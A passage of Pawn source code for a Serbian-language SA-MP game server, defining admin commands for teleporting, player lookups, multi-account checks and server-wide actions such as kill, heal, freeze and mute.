	if( II[ id ][ iOruzje ][ 3 ] != 0) format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ id ][ iOruzje ][ 3 ] ] );
	else strmid(wepname4, "None", 0, 5);

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	format( globalstring, sizeof( globalstring ), "{4282C0}Novac: {FFFFFF}($%s)\n", fNumber(II[id][iMoney]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Materijali: {FFFFFF}(%s)\n", fNumber(II[id][iMats]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Droga: {FFFFFF}(%sg)\n\n", fNumber(II[id][iDrugAmmount]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Oruzje 1: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%s)\n", wepname1, fNumber(II[id][iMunicija][0]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Oruzje 2: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%s)\n", wepname2, fNumber(II[id][iMunicija][1]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Oruzje 3: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%s)\n", wepname3, fNumber(II[id][iMunicija][2]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{4282C0}Oruzje 4: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%s)\n\n", wepname4, fNumber(II[id][iMunicija][3]));
	strcat( DialogStrgEx, globalstring );

	format( globalstring, sizeof( globalstring ), "{CCCCCC}ID: %d | Vlasnik: %s", id, II[ id ][ iOwner ] );

	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, globalstring, DialogStrgEx, "OK", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:oport( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 6)
	{
		new Float:Pos[ 3 ],odabir[ 20 ], id;
		if( sscanf( params, "s[20]i", odabir, id ) )
		{
			SendUsageMessage( playerid, "/oport [vrsta] [id]");
			SendClientMessage(playerid, -1, "Vrsta: imovina, firma, vozilo, organizacija");
			SendClientMessage(playerid, -1, "Vrsta: kontejner, posao, kapija, gangzona, gift");
			return 1;
		}
		else
		{
			if(strcmp(odabir, "imovina", true) == 0)
			{
				if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");

			    SMG_SetPlayerPos( playerid, II[ id ][ iEnter ][ 0 ], II[ id ][ iEnter ][ 1 ], II[ id ][ iEnter ][ 2 ] );
			    SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do kuce ID {FFFFFF}(%d).", id);
			}
			else if(strcmp(odabir, "firma", true) == 0)
			{
				if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

			    SMG_SetPlayerPos( playerid, BusinessInfo[ id ][ bEnterX ], BusinessInfo[ id ][ bEnterY ], BusinessInfo[ id ][ bEnterZ ] );
			   	SetPlayerInterior( playerid,0 );
				SetPlayerVirtualWorld( playerid,0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do firme ID {FFFFFF}(%d).", id);
			}
	        else if(strcmp(odabir, "vozilo", true) == 0)
			{
				if( id != IVI ) return SendErrorMessage( playerid, "To vozilo(ID) ne postoji na serveru!");

				GetVehiclePos( id, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			    SMG_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ]+3 );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do vozila ID {FFFFFF}(%d).", id);
			}
			else if(strcmp(odabir, "organizacija", true) == 0)
			{
				if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
			    SMG_SetPlayerPos( playerid, org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ] );
			   	checkOrgEntrance( playerid, id );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do organizacije ID {FFFFFF}(%d).", id);
			}
			else if(strcmp(odabir, "kontejner", true) == 0)
			{
				if( id < 1 || KontInfo[ id ][ koSQLID ] == 0 ) return SendErrorMessage( playerid, "Taj kontejner(ID) ne postoji u bazi podataka!");
			    SMG_SetPlayerPos( playerid, KontInfo[ id ][ koObjPos ][ 0 ]+2, KontInfo[ id ][ koObjPos ][ 1 ], KontInfo[ id ][ koObjPos ][ 2 ] );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do kontejnera ID {FFFFFF}(%d).", id);
			}
			else if(strcmp(odabir, "kapija", true) == 0)
			{
				if( GateData[ id ][ gatebaseID ] == 0 ) return SendErrorMessage( playerid, "Ta kapija(ID) ne postoji u bazi podataka!");
			    SMG_SetPlayerPos( playerid, GateData[ id ][ gatePos ][ 0 ]+2, GateData[ id ][ gatePos ][ 1 ], GateData[ id ][ gatePos ][ 2 ] );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do kapije ID {FFFFFF}(%d).", id);
			}
			else if(strcmp(odabir, "posao", true) == 0)
			{
				if( id < 1 || id > MAX_JOBS ) return SendErrorMessage( playerid, "Taj posao(ID) ne postoji u bazi podataka(1-%d).", MAX_JOBS);
				id--;
				SMG_SetPlayerPos( playerid, jobsInfos[ id ][ jPos ][ 0 ], jobsInfos[ id ][ jPos ][ 1 ], jobsInfos[ id ][ jPos ][ 2 ] );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do posla ID {FFFFFF}%s.", jobsInfos[ id ][ jName ] );
			}
			else if(strcmp(odabir, "gangzona", true) == 0)
			{
				if( id < 0 || id > MAX_GZONE ) return SendErrorMessage( playerid, "Ta gangzona(ID) ne postoji u bazi podataka.");
				SMG_SetPlayerPos( playerid, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ] );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do ganzone ID {FFFFFF}%d.", id );
			}
			else if(strcmp(odabir, "gift", true) == 0)
			{
				if( id < 0 || id > MAX_GIFT ) return SendErrorMessage( playerid, "Taj gift(ID) ne postoji u bazi podataka.");
				SMG_SetPlayerPos( playerid, GiftInfo[id][gPosX], GiftInfo[id][gPosY], GiftInfo[id][gPosZ] );

			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

				SCMF( playerid, 0xCCCCCCFF, "(OPORT): Teleportovali ste se do gifta ID {FFFFFF}%d.", id );
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:lp( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		strcat( DialogStrgEx, "#\tIme Igraca\tID Igraca" );

		for( new i = 1; i < MAX_ASKQS; i++ )
		{
			format( globalstring, 144, "\n%d\t%s\t(%d)", i, askqList[ i ][ askqOwner ], askqList[ i ][ askqID ] );
            strcat( DialogStrgEx, globalstring );
		}

		ShowPlayerDialog( playerid, dialog_ASKLISTA, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, DialogStrgEx, "Odaberi", "Odustani" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:port(playerid)
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        if( PlayerInfo[ playerid ][ xAdmin ] < 7 )
		{
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
		}
		ShowPlayerDialog(playerid, dialog_TELEPORTS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberite teleport:", "{4282C0}(1). {FFFFFF}Lokacije\n\
																										{4282C0}(2). {FFFFFF}Poslovi\n\
																										{4282C0}(3). {FFFFFF}Organizacije\n\
																										{4282C0}(4). {FFFFFF}Misije", "Potvrdi", "Odustani");
	}
	else if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
	{
  		if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si na CS:DM." );
  		if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
		if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
		if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );

		ShowPlayerDialog(playerid, dialog_TELEPORTS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberite teleport:", "{4282C0}(1). {FFFFFF}Lokacije\n{4282C0}(2). {FFFFFF}Poslovi\n{4282C0}(3). {FFFFFF}Organizacije", "Potvrdi", "Odustani");
	}
	else if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ] [ xPromoter ] >= 1 || PlayerInfo[ playerid ] [ xYouTuber ] >= 1 )
	{
		if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok svercas." );
        if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
        if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si na CS:DM." );
        if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
		if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );
		if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
        if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
		if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
		if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
		if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );
		if( ServerInfo[ PaketPoceo ] ) return SendErrorMessage( playerid, "Ne mozes se portati jer je pokrenut sistem paketa za mafije (ANTI ABUSE)." );
        if( gettime() < CooldownPort[ playerid ] ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", CooldownPort[ playerid ] - gettime() );

		ShowPlayerDialog(playerid, dialog_TELEPORTS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberite teleport:", "{4282C0}(1). {FFFFFF}Lokacije\n{4282C0}(2). {FFFFFF}Poslovi", "Potvrdi", "Odustani");
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:mark( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 3)
	{
		GetPlayerPos( playerid, PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );

        new q[ 144 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `marker_p1` = '%f', `marker_p2` = '%f', `marker_p3` = '%f' WHERE `user_id` = '%d' LIMIT 1",
											PlayerInfo[ playerid ][ xMarker ][ 0 ],
											PlayerInfo[ playerid ][ xMarker ][ 1 ],
											PlayerInfo[ playerid ][ xMarker ][ 2 ],
											PlayerInfo[ playerid ][ xID ] );
		mysql_tquery( mSQL, q );

		SendInfoMessage( playerid, "Sacuvao si poziciju za teleportovanje kucajte [ /gotomark ] kada vam zatreba.");
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:gotomark( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 3)
	{
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 3 || PlayerInfo[ playerid ][ xPromoter ] >= 3)
		{
			if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok svercas." );
            if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si na CS-DM." );
            if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
		}

		if( GetPlayerState( playerid ) == 2 )
		{
			SMG_SetVehiclePos( GetPlayerVehicleID( playerid ), PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );

	        SendInfoMessage( playerid, "Teleportovali ste na oznacenu poziciju.");
		}
		else
		{
			SMG_SetPlayerPos( playerid, PlayerInfo[ playerid ][ xMarker ][ 0 ], PlayerInfo[ playerid ][ xMarker ][ 1 ], PlayerInfo[ playerid ][ xMarker ][ 2 ] );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );

			SendInfoMessage( playerid, "Teleportovali ste na oznacenu poziciju.");
		}

		if( PlayerInfo[ playerid ][ xVIPLevel ] >= 3 )
		{ 
			DodajWarnRed("~y~(GOTOMARK) %s ~w~se teleportova%s do mark pointa.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:proveri( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/proveri [id]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete to direktoru i vlasniku!" );
		if(IsSpecialUser(id) || !strcmp(ImeIgraca(id), "Carl")) return SendErrorMessage(playerid, "A ti bi njih?");

		ShowDialogStats( playerid, id );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pip(playerid, const params[])
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/pip [id]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete to direktoru i vlasniku!" );
		if(IsSpecialUser(id) || !strcmp(ImeIgraca(id), "Carl")) return SendErrorMessage(playerid, "A ti bi njih?");

        new playersip[ 128 ];
        GetPlayerIp(id, playersip, sizeof( playersip ) );

		SCMF( playerid, 0xF0F0F0FF, "IP Adresa: [%s]", playersip ); 
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offplayerveh( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  )
	{
		new imeigraca[MAX_PLAYER_NAME];
		if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/(opv)offplayerveh [Ime_Prezime]" );

		if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da proveri vozila online [ /(pv)playervehicles ].");
			return 1;
		}

		new query[ 256 ];
		mysql_format( mSQL, query, sizeof(query),
				"SELECT users.vehicle_slots, IFNULL(vehicles.veh_id, 0) AS `veh_id`, IFNULL(vehicles.v_model, 0) AS `v_model` FROM users \
				LEFT JOIN vehicles ON users.user_id = vehicles.owner_sqlID \
				WHERE users.p_name = '%e'",
					imeigraca );

		mysql_tquery( mSQL, query, "CheckPlayerOffVeh", "is", playerid, imeigraca );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
alias:offplayerveh( "opv" );

CMD:deleteoffveh( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
	{
		new imeigraca[MAX_PLAYER_NAME], sqlbaseid;
		if( sscanf( params, "s[24]d", imeigraca, sqlbaseid ) ) return SendUsageMessage( playerid, "/deleteoffveh [Ime_Prezime] [sqlBaseID]" );
		if( sqlbaseid < 1 ) return SendErrorMessage( playerid, "SQLBaseID ne moze ispod 1." );
		if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) return SendErrorMessage( playerid, "Taj igrac je online tako da skini mu online [ /(pv)playervehicles ].");

        VehicleOffSaleVehID[ playerid ] = 0;

		new query[ 256 ];
		mysql_format( mSQL, query, sizeof(query),
													"SELECT `veh_id`, IFNULL(vehicles.v_model, 0) AS `v_model` FROM users \
													INNER JOIN vehicles ON users.user_id = vehicles.owner_sqlID \
													WHERE users.p_name = '%e' AND veh_id = '%d' AND v_usage = '1' LIMIT 1",
																																imeigraca, sqlbaseid );

		mysql_tquery( mSQL, query, "deleteoffvehicle", "is", playerid, imeigraca );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:multiacc( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new ip_adresa[ 22 ];
		if( sscanf( params, "s[22]", ip_adresa ) ) return SendUsageMessage( playerid, "/multiacc [ip]" );

		new file_name[ 60 ];
		format( file_name, sizeof( file_name ), "MultiAccs/%s.cfg", ip_adresa );

		if( fexist( file_name ) )
		{
            strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            strcat( DialogStrgEx, "{FFFFFF}Nalozi na koje je ulazeno sa ove ip adrese:\n{FF0000}" );

			new File:_h_handler = fopen(file_name, io_read), _l_str[256],
	        	imeigraca[ 2 ][ 128 ];

			while( fread(_h_handler, _l_str))
			{
			    split( _l_str, imeigraca, ',' );

				format( globalstring, sizeof( globalstring ), "\n%s", imeigraca[ 0 ] );
			    strcat( DialogStrgEx, globalstring );
			}

			fclose( _h_handler );

			ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, ip_adresa, DialogStrgEx, "OK", "" );
    		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		}
		else return SendErrorMessage( playerid, "Ne postoji fajl sa ovom ip adresom." );
	}
	return 1;
}

CMD:multiips( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new imeigraca[MAX_PLAYER_NAME];
		if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/multiips [Ime_Prezime]" );

		new file_name[ 40 ];
		format( file_name, sizeof( file_name ), "MultiIPs/%s.cfg", imeigraca );

		if( fexist( file_name ) )
		{
            strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            strcat( DialogStrgEx, "{FFFFFF}IP Adrese sa kojima je ulazeno na ovaj account:\n{FF0000}" );

			new File:_h_handler = fopen(file_name, io_read), _l_str[256],
	        	ipigraca[ 2 ][ 128 ];

			while( fread(_h_handler, _l_str))
			{
			    split( _l_str, ipigraca, ',' );

				format( globalstring, sizeof( globalstring ), "\n%s", ipigraca[ 0 ] );
			    strcat( DialogStrgEx, globalstring );
			}

			fclose( _h_handler );

			ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, imeigraca, DialogStrgEx, "OK", "" );
    		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		}
		else return SendErrorMessage( playerid, "Ne postoji fajl o ovom igracu." );
	}
	return 1;
}

CMD:aktivnostigraca( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
	{
		new imeigraca[MAX_PLAYER_NAME];
		if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/aktivnostigraca [Ime_Prezime]" );

		if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da proveri ga online.");
			return 1;
		}

        mysql_tquery( mSQL, "SET OPTION SQL_BIG_SELECTS = 1" );

		new query[ 700 ];
		mysql_format( mSQL, query, sizeof(query),
				"SELECT users.sex, users.level, users.xOnlineSati, users.exp, users.money, users.xBRacun, users.warn, users.job_id, users.age, \
				users.property_id_1, users.property_id_2, users.property_id_3, users.bussines_id, users.staff_min, users.last_login, users.admin_lvl, users.helper_level, \
				users.email, users.reg_date, users.user_ip, IFNULL(org_members.org_id, 0) AS `org_id`, org_members.memb_rank, IFNULL(banned.ban_id, 0) AS `ban_id`, banned.ban_reason FROM users \
			    LEFT JOIN org_members ON users.user_id = org_members.memb_sqlID \
                LEFT JOIN banned ON users.user_id = banned.user_id \
			    WHERE users.p_name = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffStats", "is", playerid, imeigraca );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:kill( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 2 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id;
		if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/kill [id]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < PlayerInfo[ id ][ xAdmin ] ) return SendErrorMessage( playerid, "Ne mozete to jacem ranku od sebe!" );

		if( AdminDuty[id] ) AdminDuty[id] = false;

		SetPlayerHealth( id, 0 );
		SCMF( id, ANTICHEAT, "#KILL: {FFFFFF}%s ubije%s si od Admina %s", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );
 
		DodajWarnRed("~r~(KILL) %s ~w~je ubije%s od Admina ~r~%s.", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:spavnuj( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id;
		if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/spavnuj [id]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 5 ) return SendErrorMessage( playerid, "Ne mozete to direktoru i vlasniku!" );

		if(IsPlayerInAnyVehicle(id))
		{
			new Float:Pos[3];
			GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
			SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2] + 2.0);
		}

		SMG_SetSpawnInfo( id );
		SpawnPlayer( id );

		SCMF( id, ANTICHEAT, "#SPAWN: {FFFFFF}%s spavna%s si ponovno od Admina %s.", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );
 
		DodajWarnRed("~r~(SPAVNUJ) %s ~w~je spavna%s ponovno od Admina ~r~%s.", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:healall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		foreach( new i : Player)
		{
			if( i != IPI ) SetPlayerHealth( i, 100 );
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "(HEAL - ALL): {FFFFFF}%s {FF4500}je napuni%s HP svima.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:armorall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		foreach( new i : Player)
		{
			if( i != IPI ) SetPlayerArmour( i, 99 );
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "(ARMOR - ALL): {FFFFFF}%s {FF4500}je napuni%s armor svima.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:freezeall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		foreach( new i : Player)
		{
			if( i != IPI ) SMG_TogglePlayerControllable( i, false );
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "#FREEZEALL: {FFFFFF}%s je zaledi%s sve igrace.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:muteall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		foreach(new i : Player)
		{
			PlayerInfo[ i ][ xMute ] = gettime()+(100*60);
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "#MUTEALL: {FFFFFF}%s je mutira%s sve igrace.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:gethereall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new Float:x, Float:y, Float:z;
		GetPlayerPos( playerid, x, y, z );

		foreach( new i : Player)
		{
			new rand = random(10);
			SMG_SetPlayerPos( i, x+rand, y+rand, z );
			SetPlayerInterior( i, GetPlayerInterior( playerid ) );
			SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "#GETHEREALL: {FFFFFF}%s je teleportova%s sve igrace do sebe.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unmuteall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
        static q[120];
		foreach( new i : Player)
		{
			PlayerInfo[ i ][ xMute ] = 0;
			mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `mute` = '0' WHERE `user_id` = '%d'", PlayerInfo[i][xID]);
			mysql_tquery(mSQL, q);
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "#UNMUTEALL: {FFFFFF}%s je odmutira%s sve igrace.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unfreezeall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		foreach( new i : Player)
		{
